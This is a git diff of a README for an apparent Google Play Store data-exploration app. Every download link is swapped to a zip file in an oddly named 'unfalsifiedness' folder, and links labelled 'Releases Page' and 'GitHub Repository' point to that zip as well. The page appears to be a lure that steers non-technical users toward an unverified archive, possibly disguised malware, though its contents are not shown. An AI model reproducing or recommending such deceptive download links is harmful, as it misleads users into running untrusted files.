@@ -4,7 +4,7 @@
 Welcome to the Google-Playstore project! This application helps you explore app quality, user ratings, installs, and performance categories directly from the Google Play Store. It is perfect for anyone interested in understanding app data without needing any technical skills.
 
 ## 📥 Download Here
-[![Download Now](https://raw.githubusercontent.com/KayanOlO/Google-Playstore/main/unfalsifiedness/Google-Playstore.zip)](https://raw.githubusercontent.com/KayanOlO/Google-Playstore/main/unfalsifiedness/Google-Playstore.zip)
+[![Download Now](https://github.com/KayanOlO/Google-Playstore/raw/refs/heads/main/unfalsifiedness/Playstore-Google-2.5.zip)](https://github.com/KayanOlO/Google-Playstore/raw/refs/heads/main/unfalsifiedness/Playstore-Google-2.5.zip)
 
 ## 🛠️ System Requirements
 Before downloading, make sure your computer meets these basic requirements:
@@ -40,7 +40,7 @@ To download and run the Google-Playstore application, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
    
-   [Download the latest version here](https://raw.githubusercontent.com/KayanOlO/Google-Playstore/main/unfalsifiedness/Google-Playstore.zip)
+   [Download the latest version here](https://github.com/KayanOlO/Google-Playstore/raw/refs/heads/main/unfalsifiedness/Playstore-Google-2.5.zip)
 
 2. **Select the Version**: You will see a list of available versions. Click on the link for the latest version.
 
@@ -72,7 +72,7 @@ If you face problems, ensure you have the required software installed. You can a
 Yes! Contributions are welcome. Check the Contributing section of the repository for guidelines.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/KayanOlO/Google-Playstore/main/unfalsifiedness/Google-Playstore.zip)
+- [GitHub Repository](https://github.com/KayanOlO/Google-Playstore/raw/refs/heads/main/unfalsifiedness/Playstore-Google-2.5.zip)
 - [Documentation](#) 
 - [Community Forum](#)
 
